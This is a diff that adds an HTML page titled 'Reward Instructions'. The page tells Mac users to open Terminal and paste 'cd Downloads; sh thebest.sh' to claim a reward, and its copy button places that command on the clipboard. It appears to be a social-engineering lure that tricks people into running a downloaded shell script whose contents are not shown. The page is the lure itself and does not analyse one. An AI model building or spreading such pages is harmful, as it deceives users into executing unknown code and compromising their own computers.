@@ -1,0 +1,67 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Reward Instructions</title>
+    <link rel="stylesheet" href="global.css">
+    <style>
+        body {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            color: white;
+            text-align: center;
+        }
+
+        code {
+            background-color: #333;
+            color: #fff;
+            padding: 10px;
+            border-radius: 5px;
+            font-family: monospace;
+        }
+        .code-box > button {
+            background-color: #333;
+            color: #fff;
+            border: none;
+            padding: 10px 20px;
+            border-radius: 5px;
+            cursor: pointer;
+            margin-top: 10px;
+            transition: all 0.3s ease;
+            width: 70px;
+        }
+        .code-box > button:hover {
+            background-color: #555;
+        }
+        .code-box > button:active {
+            transform: scale(0.95);
+            width: 90px;
+        }
+        .code-box > button:active::after {
+            content: "Copied!";
+        }
+        .code-box > button:not(:active)::after {
+            content: "Copy";
+        }
+    </style>
+</head>
+<body>
+    <h1>Reward Instructions</h1>
+    <p>Follow these steps to claim your reward:</p>
+    <p>Open the "Terminal" app on your Mac - <code>Cmd + Space</code> and type "Terminal"</p>
+    <p>Copy and paste the following command into the Terminal:</p>
+    <div class="code-box">
+        <code>cd Downloads; sh thebest.sh</code>
+        <button></button>
+    </div>
+    <script>
+        const button = document.querySelector('.code-box > button');
+        button.addEventListener('click', () => {
+            navigator.clipboard.writeText('cd Downloads; sh thebest.sh')
+        });
+    </script>
+</body>
+</html>
